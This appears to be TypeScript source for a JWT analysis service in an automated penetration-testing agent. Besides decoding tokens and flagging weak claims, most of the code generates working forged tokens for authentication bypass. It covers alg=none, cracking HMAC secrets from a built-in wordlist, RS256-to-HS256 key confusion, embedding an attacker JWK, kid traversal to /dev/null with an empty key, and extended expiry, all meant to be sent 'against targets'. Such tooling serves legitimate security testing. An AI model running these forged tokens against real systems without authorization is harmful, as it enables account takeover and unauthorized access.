/**
 * JWT Analyzer Service
 *
 * Auto-decode, analyze, and test JWT vulnerabilities:
 * - Decode header + payload without verification
 * - Detect sensitive data in payload
 * - Test: alg=none, weak HMAC, key confusion, JWK injection, kid injection, expiry bypass
 * - Generate attack tokens for the agent to test against targets
 */

import { Injectable } from '@nestjs/common';
import * as crypto from 'crypto';

// ─── Types ───────────────────────────────────────────────────────────────────

export interface JwtHeader {
  alg: string;
  typ?: string;
  kid?: string;
  jwk?: any;
  jku?: string;
  x5u?: string;
  x5c?: string[];
  [key: string]: any;
}

export interface JwtPayload {
  sub?: string;
  iss?: string;
  aud?: string | string[];
  exp?: number;
  nbf?: number;
  iat?: number;
  jti?: string;
  [key: string]: any;
}

export interface SensitiveDataHit {
  field: string;
  type: 'email' | 'password' | 'token' | 'secret' | 'credit_card' | 'ssn' | 'ip' | 'api_key' | 'private_key' | 'other';
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
}

export interface AttackTest {
  name: string;
  description: string;
  attack_type: 'alg_none' | 'weak_hmac' | 'key_confusion' | 'jwk_injection' | 'kid_injection' | 'expiry_bypass';
  severity: 'critical' | 'high' | 'medium' | 'low';
  vulnerable: boolean;
  details: string;
  test_token?: string;
  secret_found?: string;
}

export interface JwtAnalysisResult {
  // Decoded parts
  header: JwtHeader;
  payload: JwtPayload;
  signature: string;
  raw: { header: string; payload: string; signature: string };

  // Analysis
  algorithm: string;
  key_id: string | null;
  expiry: string | null;
  is_expired: boolean;
  claims: Record<string, any>;
  sensitive_data: SensitiveDataHit[];
  security_issues: string[];

  // Attack tests
  attacks: AttackTest[];

  // Summary
  risk_level: 'critical' | 'high' | 'medium' | 'low' | 'info';
  exploitable_attacks: number;
  total_attacks_tested: number;
}

// ─── Weak secrets (top ~100 from common JWT wordlists) ──────────────────────

const WEAK_SECRETS = [
  'secret', 'password', '123456', 'jwt_secret', 'changeme', 'admin', 'test',
  'key', 'mysecret', 'supersecret', 'jwt-secret', 'your-256-bit-secret',
  'my-secret-key', 'mysecretkey', 'secretkey', 'jwt_secret_key',
  'HS256-secret', 'default', 'token', 'auth', 'api_key', 'api-key',
  'private', 'public', 'jwt', 'bearer', 'access', 'refresh',
  'qwerty', 'abc123', 'letmein', 'welcome', 'monkey', 'master',
  'dragon', 'login', 'princess', 'football', 'shadow', 'sunshine',
  'trustno1', 'iloveyou', 'batman', 'access14', 'starwars',
  'hello', 'charlie', 'donald', '1234567890', '123456789',
  '12345678', '1234567', '12345', '1234', '123', '1',
  'qwerty123', '1q2w3e4r', 'passw0rd', 'Pass@123', 'P@ssw0rd',
  'admin123', 'root', 'toor', 'guest', 'user', 'demo',
  'development', 'production', 'staging', 'local', 'dev', 'prod',
  'fallback', 'default-secret', 'change-me', 'change_me',
  'keyboard-cat', 'shhh', 'very-secret', 'top-secret',
  'my-voice-is-my-passport', 'open-sesame', 'sesame',
  'hmac-secret', 'signing-key', 'verify-key', 'encryption-key',
  'base64-secret', 'hex-secret', 'string-secret', 'random-secret',
  'some-secret', 'another-secret', 'example', 'sample',
  'test-secret', 'test-key', 'dummy', 'fake', 'placeholder',
  'jwt_signing_key', 'jwt_verification_secret', 'token_secret',
  'auth_secret', 'session_secret', 'cookie_secret',
  'NODE_ENV', 'JWT_SECRET', 'APP_SECRET', 'AUTH_SECRET',
];

@Injectable()
export class JwtAnalyzerService {

  // ─── Public API ──────────────────────────────────────────────────────────

  /**
   * Analyze a JWT token: decode, detect issues, run attack tests.
   */
  async analyze(token: string): Promise<JwtAnalysisResult> {
    const cleanToken = this.cleanToken(token);
    const parts = cleanToken.split('.');

    if (parts.length !== 3) {
      throw new Error(`Invalid JWT format: expected 3 parts (header.payload.signature), got ${parts.length}`);
    }

    // Decode
    const header = this.decodeBase64Url(parts[0]) as JwtHeader;
    const payload = this.decodeBase64Url(parts[1]) as JwtPayload;
    const signature = parts[2];

    // Basic analysis
    const algorithm = header.alg || 'unknown';
    const keyId = header.kid || null;
    const expiry = payload.exp ? new Date(payload.exp * 1000).toISOString() : null;
    const isExpired = payload.exp ? Date.now() > payload.exp * 1000 : false;
    const claims = this.extractClaims(payload);
    const sensitiveData = this.detectSensitiveData(payload);
    const securityIssues = this.detectSecurityIssues(header, payload);

    // Run attack tests
    const attacks = this.runAttackTests(cleanToken, header, payload, parts);

    // Summary
    const exploitableCount = attacks.filter(a => a.vulnerable).length;
    const riskLevel = this.calculateRiskLevel(attacks, sensitiveData, securityIssues);

    return {
      header,
      payload,
      signature,
      raw: { header: parts[0], payload: parts[1], signature: parts[2] },
      algorithm,
      key_id: keyId,
      expiry,
      is_expired: isExpired,
      claims,
      sensitive_data: sensitiveData,
      security_issues: securityIssues,
      attacks,
      risk_level: riskLevel,
      exploitable_attacks: exploitableCount,
      total_attacks_tested: attacks.length,
    };
  }

  // ─── Token Decoding ─────────────────────────────────────────────────────

  private cleanToken(token: string): string {
    let t = token.trim();
    // Strip Bearer prefix
    if (t.toLowerCase().startsWith('bearer ')) {
      t = t.slice(7).trim();
    }
    // Strip quotes
    if ((t.startsWith('"') && t.endsWith('"')) || (t.startsWith("'") && t.endsWith("'"))) {
      t = t.slice(1, -1).trim();
    }
    return t;
  }

  private decodeBase64Url(str: string): any {
    // base64url → base64
    let b64 = str.replace(/-/g, '+').replace(/_/g, '/');
    // Pad
    while (b64.length % 4 !== 0) {
      b64 += '=';
    }
    const decoded = Buffer.from(b64, 'base64').toString('utf8');
    try {
      return JSON.parse(decoded);
    } catch {
      return decoded;
    }
  }

  private encodeBase64Url(data: any): string {
    const json = typeof data === 'string' ? data : JSON.stringify(data);
    return Buffer.from(json, 'utf8')
      .toString('base64')
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=+$/, '');
  }

  // ─── Claims Extraction ──────────────────────────────────────────────────

  private extractClaims(payload: JwtPayload): Record<string, any> {
    const standardClaims = ['sub', 'iss', 'aud', 'exp', 'nbf', 'iat', 'jti'];
    const claims: Record<string, any> = {};

    for (const [key, value] of Object.entries(payload)) {
      if (standardClaims.includes(key)) {
        claims[key] = value;
      } else {
        // Custom claim
        claims[`custom:${key}`] = value;
      }
    }
    return claims;
  }

  // ─── Sensitive Data Detection ───────────────────────────────────────────

  private detectSensitiveData(payload: JwtPayload): SensitiveDataHit[] {
    const hits: SensitiveDataHit[] = [];
    const payloadStr = JSON.stringify(payload).toLowerCase();

    for (const [key, value] of Object.entries(payload)) {
      if (value == null || typeof value === 'number' || typeof value === 'boolean') continue;
      const valStr = String(value).toLowerCase();
      const keyLower = key.toLowerCase();

      // Email detection
      if (typeof value === 'string' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
        hits.push({ field: key, type: 'email', severity: 'medium', description: `Email address found in claim "${key}": ${value}` });
      }

      // Password/secret fields
      if (/pass(word|wd)?|secret|token|api.?key|private.?key|auth/i.test(key)) {
        hits.push({ field: key, type: 'password', severity: 'high', description: `Sensitive field "${key}" found in JWT payload — should not be in client-side token` });
      }

      // Credit card patterns
      if (typeof value === 'string' && /\b(?:\d{4}[- ]?){3}\d{4}\b/.test(value)) {
        hits.push({ field: key, type: 'credit_card', severity: 'critical', description: `Possible credit card number in claim "${key}"` });
      }

      // SSN patterns
      if (typeof value === 'string' && /\b\d{3}-\d{2}-\d{4}\b/.test(value)) {
        hits.push({ field: key, type: 'ssn', severity: 'critical', description: `Possible SSN in claim "${key}"` });
      }

      // IP addresses
      if (typeof value === 'string' && /\b(?:\d{1,3}\.){3}\d{1,3}\b/.test(value)) {
        hits.push({ field: key, type: 'ip', severity: 'low', description: `IP address found in claim "${key}": ${value}` });
      }

      // Long strings that might be tokens/keys
      if (typeof value === 'string' && value.length > 50 && /^[a-zA-Z0-9+/=_-]+$/.test(value)) {
        hits.push({ field: key, type: 'token', severity: 'medium', description: `Possible embedded token/key in claim "${key}" (${value.length} chars)` });
      }
    }

    return hits;
  }

  // ─── Security Issues Detection ──────────────────────────────────────────

  private detectSecurityIssues(header: JwtHeader, payload: JwtPayload): string[] {
    const issues: string[] = [];

    // Algorithm checks
    if (!header.alg || header.alg === 'none') {
      issues.push('CRITICAL: Algorithm is "none" — signature is not verified');
    }
    if (header.alg === 'HS256' || header.alg === 'HS384' || header.alg === 'HS512') {
      issues.push('INFO: HMAC algorithm used — vulnerable to brute-force if secret is weak');
    }
    if (header.alg?.startsWith('RS') || header.alg?.startsWith('ES') || header.alg?.startsWith('PS')) {
      issues.push('INFO: Asymmetric algorithm — check for key confusion attack (RS256→HS256)');
    }

    // Header injection vectors
    if (header.jwk) {
      issues.push('CRITICAL: JWK embedded in header — possible JWK injection attack');
    }
    if (header.jku) {
      issues.push('HIGH: JKU (JWK Set URL) in header — possible remote key injection');
    }
    if (header.x5u) {
      issues.push('HIGH: X5U (X.509 URL) in header — possible remote cert injection');
    }
    if (header.kid) {
      if (header.kid.includes('..') || header.kid.includes('/') || header.kid.includes('\\')) {
        issues.push(`CRITICAL: kid contains path traversal characters: "${header.kid}"`);
      }
      if (header.kid === '/dev/null' || header.kid === '/dev/random') {
        issues.push(`CRITICAL: kid points to special file: "${header.kid}" — can bypass signature verification`);
      }
    }

    // Payload checks
    if (!payload.exp) {
      issues.push('MEDIUM: No expiry claim — token never expires');
    } else if (payload.exp * 1000 > Date.now() + 365 * 24 * 60 * 60 * 1000) {
      issues.push('MEDIUM: Expiry is more than 1 year in the future');
    }
    if (!payload.iss) {
      issues.push('LOW: No issuer claim — cannot verify token origin');
    }
    if (!payload.aud) {
      issues.push('LOW: No audience claim — token may be accepted by unintended services');
    }

    // Overly permissive claims
    if (payload.admin === true || payload.role === 'admin' || payload.is_admin === true) {
      issues.push('HIGH: Admin privileges in token claims — check if these can be tampered');
    }

    return issues;
  }

  // ─── Attack Tests ───────────────────────────────────────────────────────

  private runAttackTests(
    originalToken: string,
    header: JwtHeader,
    payload: JwtPayload,
    parts: string[],
  ): AttackTest[] {
    const attacks: AttackTest[] = [];

    // 1. alg=none attack
    attacks.push(this.testAlgNone(parts, payload));

    // 2. Weak HMAC brute force
    if (header.alg?.startsWith('HS')) {
      attacks.push(this.testWeakHmac(parts));
    } else {
      attacks.push({
        name: 'Weak HMAC Brute Force',
        description: 'Test common weak secrets against HMAC signature',
        attack_type: 'weak_hmac',
        severity: 'high',
        vulnerable: false,
        details: `Skipped — algorithm is ${header.alg}, not HMAC-based. Key confusion attack may still apply.`,
      });
    }

    // 3. Key confusion (RS256→HS256)
    if (header.alg?.startsWith('RS') || header.alg?.startsWith('PS')) {
      attacks.push(this.testKeyConfusion(parts, payload, header));
    } else {
      attacks.push({
        name: 'Key Confusion (RS256→HS256)',
        description: 'Force asymmetric algorithm to HMAC using public key as secret',
        attack_type: 'key_confusion',
        severity: 'critical',
        vulnerable: false,
        details: `Skipped — algorithm is ${header.alg}, not RSA-based.`,
      });
    }

    // 4. JWK injection
    attacks.push(this.testJwkInjection(parts, payload));

    // 5. kid injection (path traversal)
    attacks.push(this.testKidInjection(parts, payload));

    // 6. Expiry bypass
    attacks.push(this.testExpiryBypass(parts, payload));

    return attacks;
  }

  /**
   * Test 1: alg=none — strip signature, set alg to "none"
   */
  private testAlgNone(parts: string[], payload: JwtPayload): AttackTest {
    const noneHeader: JwtHeader = { alg: 'none', typ: 'JWT' };
    const forgedHeader = this.encodeBase64Url(noneHeader);
    const forgedPayload = this.encodeBase64Url(payload);
    // alg=none tokens have empty signature
    const testToken = `${forgedHeader}.${forgedPayload}.`;

    return {
      name: 'Algorithm None Attack',
      description: 'Remove signature and set alg to "none" — if server accepts, auth is bypassed',
      attack_type: 'alg_none',
      severity: 'critical',
      vulnerable: false, // Can't know without testing against server
      details: 'Generated alg=none token. Send this token to the target endpoint. If it is accepted, the server does not verify signatures.',
      test_token: testToken,
    };
  }

  /**
   * Test 2: Weak HMAC — try common secrets
   */
  private testWeakHmac(parts: string[]): AttackTest {
    const headerB64 = parts[0];
    const payloadB64 = parts[1];
    const data = `${headerB64}.${payloadB64}`;
    const originalSigB64 = parts[2];

    // Convert original signature to base64 for comparison
    const originalSig = this.base64UrlToBase64(originalSigB64);

    for (const secret of WEAK_SECRETS) {
      const testSig = crypto
        .createHmac('sha256', secret)
        .update(data)
        .digest('base64')
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');

      if (testSig === originalSigB64) {
        // Found the secret! Generate a test token
        const testToken = `${data}.${testSig}`;
        return {
          name: 'Weak HMAC Brute Force',
          description: 'Test common weak secrets against HMAC-SHA256 signature',
          attack_type: 'weak_hmac',
          severity: 'critical',
          vulnerable: true,
          details: `SECRET FOUND: "${secret}" — the JWT was signed with a weak/known secret. Attacker can forge any token.`,
          test_token: testToken,
          secret_found: secret,
        };
      }
    }

    // Also try with the data as-is (some implementations use different base64)
    for (const secret of WEAK_SECRETS) {
      const testSig = crypto
        .createHmac('sha256', secret)
        .update(data)
        .digest('base64url');

      if (testSig === originalSigB64) {
        return {
          name: 'Weak HMAC Brute Force',
          description: 'Test common weak secrets against HMAC-SHA256 signature',
          attack_type: 'weak_hmac',
          severity: 'critical',
          vulnerable: true,
          details: `SECRET FOUND: "${secret}" — the JWT was signed with a weak/known secret. Attacker can forge any token.`,
          test_token: `${data}.${testSig}`,
          secret_found: secret,
        };
      }
    }

    return {
      name: 'Weak HMAC Brute Force',
      description: 'Test common weak secrets against HMAC-SHA256 signature',
      attack_type: 'weak_hmac',
      severity: 'high',
      vulnerable: false,
      details: `Tested ${WEAK_SECRETS.length} common secrets — none matched. Server may use a strong secret, or try a larger wordlist (rockyou).`,
    };
  }

  /**
   * Test 3: Key confusion — sign with HS256 using the RSA public key as secret
   * The agent needs to provide the public key separately. This generates the token.
   */
  private testKeyConfusion(parts: string[], payload: JwtPayload, header: JwtHeader): AttackTest {
    // We can't do the full test without the public key, but we generate the attack token
    // structure. The agent will need to fetch the public key and run the actual test.
    const confuseHeader: JwtHeader = { alg: 'HS256', typ: 'JWT' };
    const forgedHeader = this.encodeBase64Url(confuseHeader);
    const forgedPayload = this.encodeBase64Url(payload);
    const data = `${forgedHeader}.${forgedPayload}`;

    return {
      name: 'Key Confusion (RS256→HS256)',
      description: 'If server uses RS256 but accepts HS256, attacker can sign with the public key',
      attack_type: 'key_confusion',
      severity: 'critical',
      vulnerable: false,
      details: `Token uses ${header.alg}. If the server also accepts HS256, fetch the RSA public key and sign: HMAC-SHA256(header.payload, PUBLIC_KEY). The agent should fetch the JWKS endpoint or public key and use craft_payload to generate the forged token.`,
      test_token: `${data}.<sign_with_public_key>`,
    };
  }

  /**
   * Test 4: JWK injection — embed attacker's key in header
   */
  private testJwkInjection(parts: string[], payload: JwtPayload): AttackTest {
    try {
      // Generate an RSA key pair for the attack
      const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
      });

      // Extract public key components (n, e) for JWK
      const pubKeyObj = crypto.createPublicKey(publicKey);
      const jwk = pubKeyObj.export({ format: 'jwk' });

      // Craft header with embedded JWK
      const attackHeader: JwtHeader = {
        alg: 'RS256',
        typ: 'JWT',
        jwk: {
          kty: 'RSA',
          n: jwk.n,
          e: jwk.e,
        },
      };

      const forgedHeader = this.encodeBase64Url(attackHeader);
      const forgedPayload = this.encodeBase64Url(payload);
      const data = `${forgedHeader}.${forgedPayload}`;

      // Sign with the attacker's private key
      const sign = crypto.createSign('RSA-SHA256');
      sign.update(data);
      const sig = sign.sign(privateKey, 'base64url');
      const testToken = `${data}.${sig}`;

      return {
        name: 'JWK Injection',
        description: 'Embed attacker-controlled JWK in header — server may use it to verify signature',
        attack_type: 'jwk_injection',
        severity: 'critical',
        vulnerable: false,
        details: 'Generated RS256 token with self-signed JWK in header. If the server uses the JWK from the header (instead of its own key), this token will be accepted.',
        test_token: testToken,
      };
    } catch {
      return {
        name: 'JWK Injection',
        description: 'Embed attacker-controlled JWK in header',
        attack_type: 'jwk_injection',
        severity: 'critical',
        vulnerable: false,
        details: 'Could not generate JWK injection token (crypto error). Try manually with jwt_tool or PyJWT.',
      };
    }
  }

  /**
   * Test 5: kid injection — path traversal to /dev/null
   */
  private testKidInjection(parts: string[], payload: JwtPayload): AttackTest {
    // If kid already contains traversal, it's already vulnerable
    const currentKid = (parts[0] ? this.decodeBase64Url(parts[0]) : {}).kid;
    const hasTraversal = currentKid && (
      currentKid.includes('..') ||
      currentKid === '/dev/null' ||
      currentKid === '/dev/random' ||
      currentKid === '/dev/zero'
    );

    if (hasTraversal) {
      // Already vulnerable — generate exploit token
      // /dev/null returns empty, so HMAC of empty string with empty key
      const attackHeader: JwtHeader = { alg: 'HS256', typ: 'JWT', kid: '/dev/null' };
      const forgedHeader = this.encodeBase64Url(attackHeader);
      const forgedPayload = this.encodeBase64Url(payload);
      const data = `${forgedHeader}.${forgedPayload}`;

      // Sign with empty string (what /dev/null reads as)
      const sig = crypto
        .createHmac('sha256', '')
        .update(data)
        .digest('base64url');
      const testToken = `${data}.${sig}`;

      return {
        name: 'kid Path Traversal',
        description: 'Manipulate kid header to point to /dev/null or predictable file',
        attack_type: 'kid_injection',
        severity: 'critical',
        vulnerable: true,
        details: `kid already contains traversal path: "${currentKid}". Generated exploit token signed with empty key (what /dev/null returns).`,
        test_token: testToken,
      };
    }

    // Generate test tokens for common kid injections
    const attackHeader: JwtHeader = { alg: 'HS256', typ: 'JWT', kid: '/dev/null' };
    const forgedHeader = this.encodeBase64Url(attackHeader);
    const forgedPayload = this.encodeBase64Url(payload);
    const data = `${forgedHeader}.${forgedPayload}`;
    const sig = crypto.createHmac('sha256', '').update(data).digest('base64url');
    const testToken = `${data}.${sig}`;

    return {
      name: 'kid Path Traversal',
      description: 'Manipulate kid header to point to /dev/null or predictable file',
      attack_type: 'kid_injection',
      severity: 'high',
      vulnerable: false,
      details: `Current kid: "${currentKid || '(none)'}". Generated test token with kid="/dev/null" signed with empty key. Test by sending this token to the target.`,
      test_token: testToken,
    };
  }

  /**
   * Test 6: Expiry bypass — extend exp claim far into the future
   */
  private testExpiryBypass(parts: string[], payload: JwtPayload): AttackTest {
    if (!payload.exp) {
      return {
        name: 'Expiry Bypass',
        description: 'Extend or remove the exp claim to make token never expire',
        attack_type: 'expiry_bypass',
        severity: 'medium',
        vulnerable: false,
        details: 'Token has no exp claim — it already never expires (or expiry is not enforced).',
      };
    }

    // Create token with exp set to 10 years from now
    const extendedPayload = { ...payload, exp: Math.floor(Date.now() / 1000) + 10 * 365 * 24 * 60 * 60 };
    const attackHeader = this.encodeBase64Url(this.decodeBase64Url(parts[0]));
    const attackPayload = this.encodeBase64Url(extendedPayload);

    // We can't re-sign without the key, so we provide both options:
    // 1. Same signature (if server doesn't verify exp before signature check)
    const testTokenSameSig = `${attackHeader}.${attackPayload}.${parts[2]}`;
    // 2. No signature (alg=none combo)
    const testTokenNoSig = `${attackHeader}.${attackPayload}.`;

    const origExp = new Date(payload.exp * 1000).toISOString();
    const newExp = new Date(extendedPayload.exp * 1000).toISOString();

    return {
      name: 'Expiry Bypass',
      description: 'Extend or remove the exp claim to make token never expire',
      attack_type: 'expiry_bypass',
      severity: 'medium',
      vulnerable: false,
      details: `Original expiry: ${origExp}. Modified to: ${newExp}. Two test tokens provided — one with original signature (tests if exp is checked before signature), one with no signature (tests alg=none combo).`,
      test_token: testTokenSameSig,
    };
  }

  // ─── Helpers ────────────────────────────────────────────────────────────

  private base64UrlToBase64(str: string): string {
    let b64 = str.replace(/-/g, '+').replace(/_/g, '/');
    while (b64.length % 4 !== 0) b64 += '=';
    return b64;
  }

  private calculateRiskLevel(
    attacks: AttackTest[],
    sensitiveData: SensitiveDataHit[],
    securityIssues: string[],
  ): 'critical' | 'high' | 'medium' | 'low' | 'info' {
    const hasCritical = attacks.some(a => a.vulnerable && a.severity === 'critical');
    const hasHigh = attacks.some(a => a.vulnerable && a.severity === 'high');
    const hasSensitiveCritical = sensitiveData.some(s => s.severity === 'critical');
    const hasHighSensitive = sensitiveData.some(s => s.severity === 'high');
    const hasCriticalIssue = securityIssues.some(i => i.startsWith('CRITICAL'));
    const hasHighIssue = securityIssues.some(i => i.startsWith('HIGH'));

    if (hasCritical || hasSensitiveCritical || hasCriticalIssue) return 'critical';
    if (hasHigh || hasHighSensitive || hasHighIssue) return 'high';
    if (sensitiveData.length > 0 || securityIssues.length > 0) return 'medium';
    if (attacks.length > 0) return 'low';
    return 'info';
  }
}
